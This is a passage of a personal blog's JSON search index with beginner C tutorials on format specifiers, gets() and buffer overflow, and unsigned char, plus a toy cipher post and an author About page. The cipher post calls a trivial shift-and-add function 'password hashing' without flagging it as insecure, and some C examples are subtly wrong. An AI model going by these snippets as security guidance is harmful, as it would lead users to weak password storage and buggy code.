\u0026lt;stdio.h\u0026gt; int main() { int a = 15454; printf(\u0026#34;%x\\n\u0026#34;, a); printf(\u0026#34;%X\u0026#34;, a); return 0; } Output:\n3c5e 3C5E String Format Specifier # The %s in C is used to print strings or take strings as input.\nSyntax:\nprintf(\u0026#34;%s...\u0026#34;, ...); scanf(\u0026#34;%s...\u0026#34;, ...); Example:\n// C program to illustrate the use of %s in C #include \u0026lt;stdio.h\u0026gt; int main() { char a[] = \u0026#34;Hi Guys\u0026#34;; printf(\u0026#34;%s\\n\u0026#34;, a); return 0; } Output:\nHi Guys Example: The working of %s with scanf() is a little bit different from its working with printf(). Let‚Äôs understand this with the help of the following C program. // C Program to illustrate the working of %s with scanf() #include \u0026lt;stdio.h\u0026gt; int main() { char str[50]; // taking string as input scanf(\u0026#34;Enter the String: %s\u0026#34;, str); printf(\u0026#34;Entered String: %s\u0026#34;, str); return 0; } Input:\nEnter the string: Hi Guys Output:\nHi As we can see, the string is only scanned till a whitespace is encountered. We can avoid that by using scansets in C.\nAddress Format Specifier # The C language also provides the format specifier to print the address/pointers. We can use %p to print addresses and pointers in C\nSyntax:\nprintf(\u0026#34;%p...\u0026#34;, ...); Example:\n#include \u0026lt;stdio.h\u0026gt; int main() { int a = 10; printf(\u0026#34;The Memory Address of a: %p\\n\u0026#34;,(void*)\u0026amp;a); return 0; } Output:\nThe Memory Address of a: 0x7ffe9645b3fc Input and Output Formatting # C language provides some tools using which we can format the input and output. They are generally inserted between the % sign and the format specifier symbol Some of them are as follows:\nA minus(-) sign tells left alignment. A number after % specifies the minimum field width to be printed if the characters are less than the size of the width the remaining space is filled with space and if it is greater then it is printed as it is without truncation. A period( . ) symbol separates field width with precision. Precision tells the minimum number of digits in an integer, the maximum number of characters in a string, and the number of digits after the decimal part in a floating value. Example of I/O Formatting # // C Program to demonstrate the formatting methods. #include \u0026lt;stdio.h\u0026gt; int main() { char str[] = \u0026#34;unlimitedcodes\u0026#34;; printf(\u0026#34;%20s\\n\u0026#34;, str); printf(\u0026#34;%-20s\\n\u0026#34;, str); printf(\u0026#34;%20.5s\\n\u0026#34;, str); printf(\u0026#34;%-20.5s\\n\u0026#34;, str); return 0; } Output:\nunlimitedcodes unlimitedcodes unlim unlim Common Questions # Does C have a format specifier for binary numbers?\nNo, the C language does not provide a format specifier for binary numbers. What is the formatted string?\nThe input and output functions in C take a string as an argument that decides how the data is displayed on the screen or the data is retrieved to the memory. This string is called the formatted string. ","date":"6 February 2025","externalUrl":null,"permalink":"/blog/programming/format-specifiers-in-c/","section":"Blog","summary":"","title":"Format Specifiers in C","type":"blog"},{"content":"BUFFER OVERFLOW Consider the below program.\nvoid read() { char str[20]; gets(str); printf(\u0026#34;%s\u0026#34;, str); return; } The code looks simple, it reads string from standard input and prints the entered string, but it suffers from Buffer Overflow as gets() doesn‚Äôt do any array bound testing. gets() keeps on reading until it sees a newline character. To avoid Buffer Overflow, fgets() should be used instead of gets() as fgets() makes sure that not more than MAX_LIMIT characters are read.\n#define MAX_LIMIT 20 void read() { char str[MAX_LIMIT]; fgets(str, MAX_LIMIT, stdin); printf(\u0026#34;%s\u0026#34;, str); getchar(); return; } NOTE: fgets() stores the ‚Äò\\n‚Äô character if it is read, so removing that has to be done explicitly by the programmer. It is hence, generally advised that your str can store at least (MAX_LIMIT + 1) characters if your intention is to keep the newline character. This is done so there is enough space for the null terminating character ‚Äò\\0‚Äô to be added at the end of the string.\nIf keeping the newline character is not intended, then one can simply do the following: int len = strlen(str); // Remove the \u0026#39;\\n\u0026#39; character and replace it with \u0026#39;\\0\u0026#39; str[len - 1] = \u0026#39;\\0\u0026#39;; ","date":"6 February 2025","externalUrl":null,"permalink":"/blog/programming/gets-is-risky-to-use/","section":"Blog","summary":"","title":"gets() is risky to use!","type":"blog"},{"content":" Introduction # char is the most basic data type in C. It stores a single character and requires a single byte of memory in almost all compilers.\nNow character datatype can be divided into 2 types:\nsigned char\nunsigned char\nunsigned char # unsigned char is a character datatype where the variable consumes all the 8 bits of the memory and there is no sign bit (which is there in signed char). So it means that the range of unsigned char data type ranges from 0 to 255. Syntax:\nunsigned char [variable_name] = [value] Example:\nunsigned char ch = \u0026#39;a\u0026#39;; Initializing an unsigned char # Initializing an unsigned char: Here we try to insert a char in the unsigned char variable with the help of ASCII value. So the ASCII value 97 will be converted to a character value, i.e. ‚Äòa‚Äô and it will be inserted in unsigned char. // C program to show unsigned char #include \u0026lt;stdio.h\u0026gt; int main() { int chr = 97; unsigned char i = chr; printf(\u0026#34;unsigned char: %c\\n\u0026#34;, i); return 0; } Output:\nunsigned char: a Initializing an unsigned char with signed value: Here we try to insert a char in the unsigned char variable with the help of ASCII value. So the ASCII value -1 will be first converted to a range 0‚Äì255 by rounding. So it will be 255. Now, this value will be converted to a character value, i.e. ‚Äò√ø‚Äô and it will be inserted in unsigned char. // C program to show unsigned char #include \u0026lt;stdio.h\u0026gt; int main() { int chr = -1; unsigned char i = chr; printf(\u0026#34;unsigned char: %c\\n\u0026#34;, i); return 0; } Output:\nunsigned char: √ø ","date":"5 February 2025","externalUrl":null,"permalink":"/blog/programming/unsigned-char-in-c-with-examples/","section":"Blog","summary":"","title":"Unsigned char in C with Examples","type":"blog"},{"content":" Introduction # In an increasingly digital world, protecting information has never been more critical. One of the oldest and most effective ways to secure data is through ciphering \u0026mdash; the process of converting plain information into unreadable text using cryptographic techniques. In this post, we\u0026rsquo;ll explore the basics of ciphering, its historical significance, and its modern applications, complete with C code examples.\nWhat Is Ciphering? # Ciphering is the process of transforming readable information (plaintext) into an encoded format (ciphertext) to protect it from unauthorized access.\nBelow is a simple example in C that uses a basic substitution cipher to encrypt a message by shifting each character: #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void encryptMessage(char *message, int shift) { for (int i = 0; i \u0026lt; strlen(message); i++) { if (message[i] \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; message[i] \u0026lt;= \u0026#39;Z\u0026#39;) { message[i] = ((message[i] - \u0026#39;A\u0026#39; + shift) % 26) + \u0026#39;A\u0026#39;; } else if (message[i] \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; message[i] \u0026lt;= \u0026#39;z\u0026#39;) { message[i] = ((message[i] - \u0026#39;a\u0026#39; + shift) % 26) + \u0026#39;a\u0026#39;; } } } int main() { char message[] = \u0026#34;HelloWorld\u0026#34;; int shift = 3; encryptMessage(message, shift); printf(\u0026#34;Encrypted Message: %s\\n\u0026#34;, message); return 0; } Classic Example: Caesar Cipher in C # Here‚Äôs a practical implementation of the classic Caesar cipher:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void caesarCipher(char *text, int shift) { for (int i = 0; i \u0026lt; strlen(text); i++) { if (text[i] \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; text[i] \u0026lt;= \u0026#39;Z\u0026#39;) { text[i] = ((text[i] - \u0026#39;A\u0026#39; + shift) % 26) + \u0026#39;A\u0026#39;; } else if (text[i] \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; text[i] \u0026lt;= \u0026#39;z\u0026#39;) { text[i] = ((text[i] - \u0026#39;a\u0026#39; + shift) % 26) + \u0026#39;a\u0026#39;; } } } int main() { char text[] = \u0026#34;SimpleText\u0026#34;; int shift = 5; caesarCipher(text, shift); printf(\u0026#34;Encrypted Caesar Cipher: %s\\n\u0026#34;, text); return 0; } Types of Ciphers # Substitution Cipher # #include \u0026lt;stdio.h\u0026gt; void simpleSubstitution(char *text) { for (int i = 0; text[i] != \u0026#39;\\0\u0026#39;; i++) { text[i] ^= 0x20; } } int main() { char text[] = \u0026#34;HelloCipher\u0026#34;; simpleSubstitution(text); printf(\u0026#34;After Substitution Cipher: %s\\n\u0026#34;, text); return 0; } Transposition Cipher # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void reverseCipher(char *text) { int len = strlen(text); for (int i = 0; i \u0026lt; len / 2; i++) { char temp = text[i]; text[i] = text[len - i - 1]; text[len - i - 1] = temp; } } int main() { char text[] = \u0026#34;CipherExample\u0026#34;; reverseCipher(text); printf(\u0026#34;Transposition Cipher: %s\\n\u0026#34;, text); return 0; } Importance of Ciphering # Ciphering ensures secure communication by making messages unreadable to unauthorized parties.\nHere‚Äôs an example using an XOR-based cipher in C:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void xorCipher(char *text, char key) { for (int i = 0; i \u0026lt; strlen(text); i++) { text[i] ^= key; } } int main() { char text[] = \u0026#34;SensitiveData\u0026#34;; char key = \u0026#39;K\u0026#39;; xorCipher(text, key); printf(\u0026#34;Ciphered Text: %s\\n\u0026#34;, text); xorCipher(text, key); printf(\u0026#34;Deciphered Text: %s\\n\u0026#34;, text); return 0; } Applications of Ciphering # One basic example is simple password hashing using bitwise operations in C:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned int hashPassword(char *password) { unsigned int hash = 0; for (int i = 0; i \u0026lt; strlen(password); i++) { hash = (hash \u0026lt;\u0026lt; 5) + password[i]; } return hash; } int main() { char password[] = \u0026#34;MySecurePassword\u0026#34;; unsigned int hash = hashPassword(password); printf(\u0026#34;Password Hash: %u\\n\u0026#34;, hash); return 0; } Ciphering is fundamental to many areas of cybersecurity, ensuring confidentiality, integrity, and privacy in data transmission and storage.\nThe Future of Ciphering # As technology evolves, the need for more advanced cryptographic techniques becomes evident. Quantum-resistant algorithms are becoming increasingly important. While such advanced methods are beyond what simple C code can demonstrate, staying informed is essential. ","date":"4 February 2025","externalUrl":null,"permalink":"/blog/cybersecurity/cryptography/unlocking-the-secrets-of-ciphering/","section":"Blog","summary":"","title":"Unlocking the Secrets of Ciphering: A Beginner‚Äôs Guide to Cryptography","type":"blog"},{"content":" WHOAMI # Hello everyone, I\u0026rsquo;m Mazen Elheni, AKA Deadnaut, a Tunisian, 21 yo, Computer Science student at ISSATSO.\nI\u0026rsquo;m a CTF player with Phr34k$ üêß and technical team member at CyberTrace.\nI mainly play Cryptography, but I also dabble in Reverse Engineering and Forensics challenges.\nThis blog contains writeups of the challenges I play or author and also my inside thoughts in cybersecurity fields.\nCVEs # No public ones yet üò≠\nINTERESTS # Cryptography got boring, so I\u0026rsquo;m exploring these topics:\nPenetration testing (currently studying the OSCP) Malware development (still reading DOCS, haven\u0026rsquo;t started yet) Red teaming Kernel exploitation (currently exploring the Linux kernel) Browser exploitation (very interesting, still noob tho) Goals # I aim to contribute to innovative security projects and collaborate with like-minded professionals, working to build secure and resilient digital environments.\n","externalUrl":null,"permalink":"/about/","section":"About","summary":"","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/projects/","section":"Projects","summary":"","title":"Projects","type":"projects"},{"content":"You can view or download my resume below:\nDownload Resume (PDF)\n","externalUrl":null,"permalink":"/resume/","section":"Resume","summary":"","title":"Resume","type":"resume"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]